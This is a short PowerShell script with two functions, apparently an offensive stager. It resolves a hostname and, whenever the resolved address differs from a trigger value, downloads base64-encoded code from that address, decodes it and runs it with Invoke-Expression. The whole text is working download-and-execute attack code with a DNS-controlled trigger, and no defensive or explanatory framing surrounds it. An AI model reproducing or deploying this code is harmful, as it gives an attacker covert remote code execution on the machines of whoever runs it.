function Invoke-CallbackIEX {
    param([string]$CallbackIP)
    $enc = (New-Object Net.WebClient).DownloadString("http://$CallbackIP/resource")
    $b = [System.Convert]::FromBase64String($enc)
    $dec = [System.Text.Encoding]::UTF8.GetString($b)
    iex $dec
}
function Wait-Dns {
    param($Hostname, $Trigger)
    foreach ($addr in [System.Net.Dns]::GetHostAddresses($Hostname)) {
        $resolved = $addr.IPAddressToString
        if ($resolved -ne $Trigger) {
            $match = $resolved
            Invoke-CallbackIEX $match
        }
    }
}
